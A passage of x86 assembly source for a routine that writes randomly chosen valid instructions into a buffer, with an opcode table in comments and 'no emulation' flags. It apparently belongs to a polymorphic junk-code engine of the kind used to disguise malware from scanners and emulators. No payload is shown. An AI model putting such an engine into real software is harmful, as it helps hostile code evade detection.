; 0x35 ... xor eax, Imm32        0x35 (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x36 (Superfluous) prefix
; 0x37 ... aaa                   0x37                 SingleByteCommand
; 0x38 ... cmp Mem8,  Reg8       0x38 (0x00-0xBF)     OPMem8Reg8
; 0x38 ... cmp Reg8,  Reg8       0x38 (0xC0-0xFF)     OPReg8Reg8
; 0x39 ... cmp Mem32, Reg32      0x39 (0x00-0xBF)     OPMem32Reg32
; 0x39 ... cmp Reg32, Reg32      0x39 (0xC0-0xFF)     OPReg32Reg32
; 0x3A ... cmp Reg8,  Mem8       0x3A (0x00-0xBF)     OPMem8Reg8
; 0x3A ... cmp Reg8,  Reg8       0x3A (0xC0-0xFF)     OPReg8Reg8
; 0x3B ... cmp Reg32, Mem32      0x3B (0x00-0xBF)     OPMem32Reg32
; 0x3B ... cmp Reg32, Reg32      0x3B (0xC0-0xFF)     OPReg32Reg32
; 0x3C ... cmp al,  Imm8         0x3C (0x00-0xFF)     OPAlImm8
; 0x3D ... cmp eax, Imm32        0x3D (0x00-0xFF)     OPEaxImm32
; NOT USED: 0x3E (Superfluous) prefix
; 0x3F ... aas                   0x3F                 SingleByteCommand
; 0x40 - 0x4F ... inc|dec Reg32                       IncDecReg32
; 0x50 - 0x5F ... push|pop Reg32                      PushPopReg32
; NOT USED: 0x60 - 0x67: pushad,popad,bound,arpl + prefixes
; 0x68 ... push Imm32            0x68 (0x00-0xFF)     PushImm321
; NOT USED: 0x69: imul [maybe in next versions]
; 0x6A ... push Imm32            0x68 (0x00-0xFF)     PushImm322
; NOT USED: 0x6B-0x6F: imul [maybe in next versions], inx, outx
; NOT USED: 0x70-0x7F: jxx
; 0x80 ... add|or|adc|sbb|and|sub|xor|cmp Reg8,  Imm8  0x80 (0xC0-0xFF)   VariousReg8Imm8
; 0x81 ... add|or|adc|sbb|and|sub|xor|cmp Reg32, Imm32 0x81 (0xC0-0xFF)   VariousReg32Imm32
; 0x82 ... add|or|adc|sbb|and|sub|xor|cmp Reg8,  Imm8  0x82 (0xC0-0xFF)   VariousReg8Imm8
; 0x83 ... add|or|adc|sbb|and|sub|xor|cmp Reg32, Imm32 0x83 (0xC0-0xFF)   VariousReg32Imm32
; NOT USED: 0x84,0x85: test [maybe in next versions]
; 0x86 ... xchg Mem8, Reg8:      0x86 (0x00-0xBF)     OPMem8Reg8
; 0x86 ... xchg Reg8, Reg8:      0x86 (0xC0-0xFF)     OPReg8Reg8
; 0x87 ... xchg Mem32, Reg32:    0x87 (0x00-0xBF)     OPMem32Reg32
; 0x87 ... xchg Reg32, Reg32:    0x87 (0xC0-0xFF)     OPReg32Reg32
; 0x88 ... mov Mem8, Reg8:       0x88 (0x00-0xBF)     OPMem8Reg8
; 0x88 ... mov Reg8, Reg8:       0x88 (0xC0-0xFF)     OPReg8Reg8
; 0x89 ... mov Mem32, Reg32:     0x89 (0x00-0xBF)     OPMem32Reg32
; 0x89 ... mov Reg32, Reg32:     0x89 (0xC0-0xFF)     OPReg32Reg32
; 0x8A ... mov Reg8, Mem8:       0x8A (0x00-0xBF)     OPMem8Reg8
; 0x8A ... mov Reg8, Reg8:       0x8A (0xC0-0xFF)     OPReg8Reg8
; 0x8B ... mov Mem32, Reg32:     0x8B (0x00-0xBF)     OPMem32Reg32
; 0x8B ... mov Reg32, Reg32:     0x8B (0xC0-0xFF)     OPReg32Reg32
; NOT USED: 0x8C-0x8F: mov (Segment registers), lea [maybe in next versions]
; 0x90 - 0x99 ... XCHG eax, Reg32 | CWDE | CDQ        SingleByteCommand
; NOT USED: 0x9A-0x9F: call, wait, pushfd, popfd, sahf, lahf
; ...
; 0xF8 ... clc                   0xF8                 SingleByteCommand
; 0xF9 ... stc                   0xF9                 SingleByteCommand
; Rest of 0xA0 - 0xFF ... [maybe in next versions] - however, the instruction set above should
;                                            do its job quite good for the moment


; ----
		cc rP,	     xor,     ebp, ebp		      ; counter
		cc rCP,      xor,     ecx, ecx
		cc rP,	     mov,     byte[CGPushPop], cl

    CreateMoreRandomCode:
		cc rBP,      mov,     ebx, 17
		cc rBCP,     xor,     ecx, ecx

		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rAP,      mov,     al, dl	  ; AL=Main random number

	   SingleByteCommand:
		cc rAPF,     cmp,     al, 0
		cc rNoEmul,  jne,     SingleByteCommandEnd

		cc rBP,      mov,     ebx, 19
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDPF,     cmp,     dl, 9
		cc rNoEmul,  ja,      SingleByteCommandSpecial

		cc rDPF,     cmp,     dl, 4
		cc rNoEmul,  jne,     SingleByteCommandFinAdd
		cc rDP,      xor,     dl, dl		      ; 0x94=xchg eax, esp
		SingleByteCommandFinAdd:
		cc rDP,      add,     dl, 0x90		      ; dl=0x90 ... 0x99
		cc rNoEmul,  jmp,     SingleByteCommand2Mem

		SingleByteCommandSpecial:
		cc rDP,      mov,     dh, 0x27			; DAA
		cc rDPF,     cmp,     dl, 10
		cc rNoEmul,  je,      SingleByteCommand2MemBef
		cc rDP,      mov,     dh, 0x2F			; DAS
		cc rDPF,     cmp,     dl, 11
		cc rNoEmul,  je,      SingleByteCommand2MemBef
		cc rDP,      mov,     dh, 0x37			; AAA
		cc rDPF,     cmp,     dl, 12
		cc rNoEmul,  je,      SingleByteCommand2MemBef
		cc rDP,      mov,     dh, 0x3F			; AAS
		cc rDPF,     cmp,     dl, 13
		cc rNoEmul,  je,      SingleByteCommand2MemBef
		cc rDP,      mov,     dh, 0xF8			; CLC
		cc rDPF,     cmp,     dl, 14
		cc rNoEmul,  je,      SingleByteCommand2MemBef
		cc rDP,      mov,     dh, 0xF9			; STC
		cc rDPF,     cmp,     dl, 15
		cc rNoEmul,  je,      SingleByteCommand2MemBef

		cc rDP,      mov,     dh, 0x90	      ; NOP

		SingleByteCommand2MemBef:
		cc rDP,      mov,     dl, dh
		SingleByteCommand2Mem:
		cc rP,	     mov,     byte[RandomCode+ebp], dl
		cc rP,	     add,     ebp, 0x1
	   cc rNoEmul,	jmp,  EndCRCCycle
	   SingleByteCommandEnd:


	   OPReg8Reg8:
		cc rAPF,     cmp,     al, 1
		cc rNoEmul,  jne,     OPReg8Reg8End

		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-2)
		cc rNoEmul,  jg,      EndCRCCycle

		cc rBP,      mov,     ebx, 21
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDP,      mov,     byte[RandomCode+ebp], 0x00   ; add Reg8, Reg8
		cc rDPF,     cmp,     dl, 0
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x02   ; add Reg8, Reg8
		cc rDPF,     cmp,     dl, 1
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x08   ; or Reg8, Reg8
		cc rDPF,     cmp,     dl, 2
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x0A   ; or Reg8, Reg8
		cc rDPF,     cmp,     dl, 3
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x10   ; adc Reg8, Reg8
		cc rDPF,     cmp,     dl, 4
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x12   ; adc Reg8, Reg8
		cc rDPF,     cmp,     dl, 5
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x18   ; sbb Reg8, Reg8
		cc rDPF,     cmp,     dl, 6
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x1A   ; sbb Reg8, Reg8
		cc rDPF,     cmp,     dl, 7
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x20   ; and Reg8, Reg8
		cc rDPF,     cmp,     dl, 8
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x22   ; and Reg8, Reg8
		cc rDPF,     cmp,     dl, 9
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x28   ; sub Reg8, Reg8
		cc rDPF,     cmp,     dl, 10
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x2A   ; sub Reg8, Reg8
		cc rDPF,     cmp,     dl, 11
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x30   ; xor Reg8, Reg8
		cc rDPF,     cmp,     dl, 12
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x32   ; xor Reg8, Reg8
		cc rDPF,     cmp,     dl, 13
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x38   ; cmp Reg8, Reg8
		cc rDPF,     cmp,     dl, 14
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x3A   ; cmp Reg8, Reg8
		cc rDPF,     cmp,     dl, 15
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x86   ; xchg Reg8, Reg8
		cc rDPF,     cmp,     dl, 16
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x88   ; mov Reg8, Reg8
		cc rDPF,     cmp,     dl, 17
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x8A   ; mov Reg8, Reg8
		cc rDPF,     cmp,     dl, 18
		cc rNoEmul,  je,      OPReg8Reg8Cont

		cc rNoEmul,  jmp,  OPReg8Reg8End

		OPReg8Reg8Cont:
		cc rBP,      mov,     ebx, (0xFF-0xC0)
		cc rBCP,     mov,     ecx, 0xC0
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rDP,      mov,     byte[RandomCode+ebp+1], dl
		cc rP,	     add,     ebp, 0x2
	   cc rNoEmul,	     jmp,  EndCRCCycle
	   OPReg8Reg8End:


	   OPReg32Reg32:
		cc rAPF,     cmp,     al, 2
		cc rNoEmul,  jne,     OPReg32Reg32End

		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-2)
		cc rNoEmul,  jg,      EndCRCCycle

		cc rBP,      mov,     ebx, 21
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDP,       mov,     byte[RandomCode+ebp], 0x01   ; add Reg32, Reg32
		cc rDPF,      cmp,     dl, 0
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x03   ; add Reg32, Reg32
		cc rDPF,      cmp,     dl, 1
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x09   ; or Reg32, Reg32
		cc rDPF,      cmp,     dl, 2
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x0B   ; or Reg32, Reg32
		cc rDPF,      cmp,     dl, 3
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x11   ; adc Reg32, Reg32
		cc rDPF,      cmp,     dl, 4
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x13   ; adc Reg32, Reg32
		cc rDPF,      cmp,     dl, 5
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x19   ; sbb Reg32, Reg32
		cc rDPF,      cmp,     dl, 6
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x1B   ; sbb Reg32, Reg32
		cc rDPF,      cmp,     dl, 7
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x21   ; and Reg32, Reg32
		cc rDPF,      cmp,     dl, 8
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x23   ; and Reg32, Reg32
		cc rDPF,      cmp,     dl, 9
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x29   ; sub Reg32, Reg32
		cc rDPF,      cmp,     dl, 10
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x2B   ; sub Reg32, Reg32
		cc rDPF,      cmp,     dl, 11
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x31   ; xor Reg32, Reg32
		cc rDPF,      cmp,     dl, 12
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x33   ; xor Reg32, Reg32
		cc rDPF,      cmp,     dl, 13
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x39   ; cmp Reg32, Reg32
		cc rDPF,      cmp,     dl, 14
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x3B   ; cmp Reg32, Reg32
		cc rDPF,      cmp,     dl, 15
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x89   ; mov Reg32, Reg32
		cc rDPF,      cmp,     dl, 16
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x8B   ; mov Reg32, Reg32
		cc rDPF,      cmp,     dl, 17
		cc rNoEmul,   je,      OPReg32Reg32Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x87   ; xchg Reg32, Reg32
		cc rDPF,      cmp,     dl, 18
		cc rNoEmul,   je,      OPReg32Reg32Cont
		cc rNoEmul,   jmp,     OPReg32Reg32End

		OPReg32Reg32Cont:
		cc rDP,       push,    edx		   ; Save dl
		cc rBP,       mov,     ebx, (0xFF-0xC0)
		cc rBCP,      mov,     ecx, 0xC0
		cc rNoEmul,   call,    CreateSpecialRndNumber
		cc rP,	      mov,     byte[RandomCode+ebp+1], dl
		cc rADP,      pop,     eax
		cc rDPF,      and,     al, 0001b
		cc rNoEmul,   jz,      OPReg32Reg32CheckESP0

		cc rDP,       mov,     byte[RandomCode+ebp+1], dl
		cc rDP,       and,     dl, 111000b
		cc rDPF,      cmp,     dl, 100000b
		cc rNoEmul,   je,      EndCRCCycle		      ; OP esp, ... but source and destination reversed
		cc rP,	      add,     ebp, 0x2
	      cc rNoEmul, jmp,	EndCRCCycle

		OPReg32Reg32CheckESP0:
		cc rDP,       mov,     dh, byte[RandomCode+ebp]
		cc rDPF,      cmp,     dh, 0x87
		cc rNoEmul,   jne,     OPReg32Reg32CheckESP1

		cc rDPF,      cmp,     dl, 0xE0
		cc rNoEmul,   jb,      OPReg32Reg32CheckESP1
		cc rDPF,      cmp,     dl, 0xE8
	      cc rNoEmul, jb,	   EndCRCCycle

		OPReg32Reg32CheckESP1:
		cc rDP,       and,     dl, 111b
		cc rDPF,      cmp,     dl, 100b
		cc rNoEmul,   je,      EndCRCCycle		      ; OP esp, ...

		cc rP,	      add,     ebp, 0x2
	   cc rNoEmul, jmp,  EndCRCCycle
	   OPReg32Reg32End:


	   OPAlImm8:
		cc rAPF,      cmp,     al, 3
		cc rNoEmul,   jne,     OPAlImm8End

		cc rPF,       cmp,     ebp, (RandomCodeBufferSize-2)
		cc rNoEmul,   jg,      EndCRCCycle

		cc rBP,       mov,     ebx, 9
		cc rBCP,      xor,     ecx, ecx
		cc rNoEmul,   call,    CreateSpecialRndNumber

		cc rDP,       mov,     byte[RandomCode+ebp], 0x04   ; add al, Imm8
		cc rDPF,      cmp,     dl, 0
		cc rNoEmul,   je,      OPAlImm8Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x0C   ; or al, Imm8
		cc rDPF,      cmp,     dl, 1
		cc rNoEmul,   je,      OPAlImm8Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x14   ; adc al, Imm8
		cc rDPF,      cmp,     dl, 2
		cc rNoEmul,   je,      OPAlImm8Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x1C   ; sbb al, Imm8
		cc rDPF,      cmp,     dl, 3
		cc rNoEmul,   je,      OPAlImm8Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x24   ; and al, Imm8
		cc rDPF,      cmp,     dl, 4
		cc rNoEmul,   je,      OPAlImm8Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x2C   ; sub al, Imm8
		cc rDPF,      cmp,     dl, 5
		cc rNoEmul,   je,      OPAlImm8Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x34   ; xor al, Imm8
		cc rDPF,      cmp,     dl, 6
		cc rNoEmul,   je,      OPAlImm8Cont

		cc rDP,       mov,     byte[RandomCode+ebp], 0x3C   ; cmp al, Imm8
		cc rDPF,      cmp,     dl, 7
		cc rNoEmul,   je,      OPAlImm8Cont
		cc rNoEmul,   jmp,  OPAlImm8End

		OPAlImm8Cont:
		cc rNoEmul,   call,    GetRandomNumber
		cc rP,	      mov,     byte[RandomCode+ebp+1], dl
		cc rP,	      add,     ebp, 0x2
	   cc rNoEmul,	  jmp,	EndCRCCycle
	   OPAlImm8End:



	   OPEaxImm32:
		cc rAPF,      cmp,	al, 4
		cc rNoEmul,   jne,	OPEaxImm32End

		cc rPF,       cmp,	ebp, (RandomCodeBufferSize-5)
		cc rNoEmul,   jg,	EndCRCCycle

		cc rBP,       mov,	ebx, 9
		cc rBCP,      xor,	ecx, ecx
		cc rNoEmul,   call,	CreateSpecialRndNumber

		cc rDP,        mov,	byte[RandomCode+ebp], 0x05   ; add eax, Imm32
		cc rDPF,       cmp,	dl, 0
		cc rNoEmul,    je,	OPEaxImm32Cont

		cc rDP,        mov,	byte[RandomCode+ebp], 0x0D   ; or eax, Imm32
		cc rDPF,       cmp,	dl, 1
		cc rNoEmul,    je,	OPEaxImm32Cont

		cc rDP,        mov,	byte[RandomCode+ebp], 0x15   ; adc eax, Imm32
		cc rDPF,       cmp,	dl, 2
		cc rNoEmul,    je,	OPEaxImm32Cont

		cc rDP,        mov,	byte[RandomCode+ebp], 0x1D   ; sbb eax, Imm32
		cc rDPF,       cmp,	dl, 3
		cc rNoEmul,    je,	OPEaxImm32Cont

		cc rDP,        mov,	byte[RandomCode+ebp], 0x25   ; and eax, Imm32
		cc rDPF,       cmp,	dl, 4
		cc rNoEmul,    je,	OPEaxImm32Cont

		cc rDP,        mov,	byte[RandomCode+ebp], 0x2D   ; sub eax, Imm32
		cc rDPF,       cmp,	dl, 5
		cc rNoEmul,    je,	OPEaxImm32Cont

		cc rDP,        mov,	byte[RandomCode+ebp], 0x35   ; xor eax, Imm32
		cc rDPF,       cmp,	dl, 6
		cc rNoEmul,    je,	OPEaxImm32Cont

		cc rDP,        mov,	byte[RandomCode+ebp], 0x3D   ; cmp eax, Imm32
		cc rDPF,       cmp,	dl, 7
		cc rNoEmul,    je,	OPEaxImm32Cont
		cc rNoEmul,    jmp,	OPEaxImm32End

		OPEaxImm32Cont:
		cc rNoEmul,    call,   GetRandomNumber
		cc rDP,        mov,    edx, dword[RandomNumber]
		cc rP,	       mov,    dword[RandomCode+ebp+1], edx
		cc rP,	       add,    ebp, 0x5
	   cc rNoEmul,	jmp,  EndCRCCycle
	   OPEaxImm32End:




	   VariousReg8Imm8:			    ; add | or | adc | sbb | and | sub | xor | cmp Reg8, Imm8
		cc rAPF,     cmp,     al, 5
		cc rNoEmul,  jne,     VariousReg8Imm8End
		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-3)
		cc rNoEmul,  jg,      EndCRCCycle

		cc rBP,      mov,     ebx, 3
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDP,      mov,     byte[RandomCode+ebp], 0x80
		cc rDPF,     cmp,     dl, 0
		cc rNoEmul,  je,      VariousReg8Imm8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x82
		cc rDPF,     cmp,     dl, 1
		cc rNoEmul,  je,      VariousReg8Imm8Cont
		cc rNoEmul,  jmp,     EndCRCCycle

		VariousReg8Imm8Cont:
		cc rBP,      mov,     ebx, (0xFF-0xC0)
		cc rBCP,     mov,     ecx, 0xC0
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rP,	     mov,     byte[RandomCode+ebp+1], dl
		cc rNoEmul,  call,    GetRandomNumber
		cc rDP,      mov,     dl, byte[RandomNumber]
		cc rP,	     mov,     byte[RandomCode+ebp+2], dl
		cc rP,	     add,     ebp, 0x3
	   cc rNoEmul,	jmp,  EndCRCCycle
	   VariousReg8Imm8End:


	   VariousReg32Imm32:			      ; add | or | adc | sbb | and | sub | xor | cmp Reg32, Imm32
		cc rAPF,     cmp,     al, 6
		cc rNoEmul,  jne,     VariousReg32ImmEnd

		cc rBP,      mov,     ebx, 3
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDPS,     mov,     esi, 6
		cc rDPS,     mov,     byte[RandomCode+ebp], 0x81
		cc rDPSF,    cmp,     dl, 0
		cc rNoEmul,  je,      VariousReg32Imm32Cont

		cc rDPS,     mov,     esi, 3
		cc rDPS,     mov,     byte[RandomCode+ebp], 0x83
		cc rDPSF,    cmp,     dl, 1
		cc rNoEmul,  je,      VariousReg32Imm32Cont
		cc rNoEmul,  jmp,     VariousReg32ImmEnd

		VariousReg32Imm32Cont:
		cc rBPS,     mov,     ebx, (0xFF-0xC0)
		cc rBCPS,    mov,     ecx, 0xC0
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rDPS,     mov,     byte[RandomCode+ebp+1], dl
		cc rDPS,     mov,     byte[RandomCode+ebp+1], dl
		cc rDPS,     and,     dl, 111b
		cc rDPSF,    cmp,     dl, 100b
		cc rNoEmul,  je,      EndCRCCycle		     ; OP esp, ...
		cc rNoEmul,  call,    GetRandomNumber
		cc rDPS,     mov,     edx, dword[RandomNumber]
		cc rPS,      mov,     dword[RandomCode+ebp+2], edx
		cc rCPS,     mov,     ecx, RandomCodeBufferSize
		cc rCPS,     sub,     ecx, esi
		cc rDPSF,    cmp,     ebp, ecx
		cc rNoEmul,  jg,      EndCRCCycle
		cc rP,	     add,     ebp, esi
	   cc rNoEmul, jmp,  EndCRCCycle
	   VariousReg32ImmEnd:




	   OPMem8Reg8:			      ; OP Mem8, Reg8  | OP Reg8, Mem8
		cc rAPF,     cmp,     al, 7
		cc rNoEmul,  jne,     OPMem8Reg8End

		cc rBP,      mov,     ebx, 19
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDP,      mov,     byte[RandomCode+ebp], 0x00   ; add Mem8, Reg8
		cc rDPF,     cmp,     dl, 0
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x02   ; add Reg8, Mem8
		cc rBCPF,    cmp,     dl, 1
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x08   ; or Mem8, Reg8
		cc rBCPF,    cmp,     dl, 2
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x0A   ; or Reg8, Mem8
		cc rBCPF,    cmp,     dl, 3
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x10   ; adc Mem8, Reg8
		cc rBCPF,    cmp,     dl, 4
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x12   ; adc Reg8, Mem8
		cc rBCPF,    cmp,     dl, 5
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x18   ; sbb Mem8, Reg8
		cc rBCPF,    cmp,     dl, 6
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x1A   ; sbb Reg8, Mem8
		cc rBCPF,    cmp,     dl, 7
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x20   ; and Mem8, Reg8
		cc rBCPF,    cmp,     dl, 8
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x22   ; and Reg8, Mem8
		cc rBCPF,    cmp,     dl, 9
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x28   ; sub Mem8, Reg8
		cc rBCPF,    cmp,     dl, 10
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x2A   ; sub Reg8, Mem8
		cc rBCPF,    cmp,     dl, 11
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x30   ; xor Mem8, Reg8
		cc rBCPF,    cmp,     dl, 12
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x32   ; xor Reg8, Mem8
		cc rBCPF,    cmp,     dl, 13
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x38   ; cmp, Mem8, Reg8
		cc rBCPF,    cmp,     dl, 14
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x3A   ; cmp, Reg8, Mem8
		cc rBCPF,    cmp,     dl, 15
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x86   ; xchg Mem8, Reg8
		cc rBCPF,    cmp,     dl, 16
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x88   ; mov Mem8, Reg8
		cc rBCPF,    cmp,     dl, 17
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rDP,      mov,     byte[RandomCode+ebp], 0x8A   ; mov Reg8, Mem8
		cc rBCPF,    cmp,     dl, 18
		cc rNoEmul,  je,      OPMem8Reg8Cont

		cc rNoEmul,  jmp,     EndCRCCycle

	     OPMem8Reg8Cont:
		cc rBP,      mov,     ebx, 0xBF
		cc rBCP,     mov,     ecx, 0x0
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rP,	     mov,     byte[RandomCode+ebp+1], dl

		cc rNoEmul,  call,    GetRandomNumber

		cc rDP,      and,     dl, 11000111b
		cc rDPF,     cmp,     dl, 00000100b
		cc rNoEmul,  je,      OPMem8Reg8_3byte
		cc rDPF,     cmp,     dl, 00000101b
		cc rNoEmul,  je,      OPMem8Reg8_6byte
		cc rDPF,     cmp,     dl, 0x40
		cc rNoEmul,  jb,      OPMem8Reg8_2byte
		cc rDPF,     cmp,     dl, 01000100b
		cc rNoEmul,  je,      OPMem8Reg8_4byte
		cc rDPF,     cmp,     dl, 0x80
		cc rNoEmul,  jb,      OPMem8Reg8_3byte
		cc rDPF,     cmp,     dl, 10000100b
		cc rNoEmul,  je,      OPMem8Reg8_7byte
		cc rNoEmul,  jmp,     OPMem8Reg8_6byte

	     OPMem8Reg8_3byte:
		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-3)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     byte[RandomCode+ebp+2], dl
		cc rP,	     add,     ebp, 0x1
		cc rNoEmul,  jmp,     EndOPMem8Reg8

	     OPMem8Reg8_4byte:
		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-4)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     word[RandomCode+ebp+2], dx
		cc rP,	     add,     ebp, 0x2
		cc rNoEmul,  jmp,     EndOPMem8Reg8

	     OPMem8Reg8_6byte:
		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-6)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     dword[RandomCode+ebp+2], edx
		cc rP,	     add,     ebp, 0x4
		cc rNoEmul,  jmp,     EndOPMem8Reg8

	     OPMem8Reg8_7byte:
		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-7)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     dword[RandomCode+ebp+2], edx
		cc rNoEmul,  call,    GetRandomNumber
		cc rDP,      mov,     dl, byte[RandomNumber]
		cc rP,	     mov,     byte[RandomCode+ebp+6], dl
		cc rP,	     add,     ebp, 0x5
		cc rNoEmul,  jmp,     EndOPMem8Reg8

	     OPMem8Reg8_2byte:
	     EndOPMem8Reg8:
		cc rP,	     add,     ebp, 0x2
	   cc rNoEmul,	jmp,  EndCRCCycle
	   OPMem8Reg8End:


	   OPMem32Reg32:			; OP Mem32, Reg32  | OP Reg32, Mem32
		cc rAPF,     cmp,     al, 8
		cc rNoEmul,  jne,     OPMem32Reg32End

		cc rBP,      mov,     ebx, 19
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDP,      mov,     byte[RandomCode+ebp], 0x01   ; add Mem32, Reg32
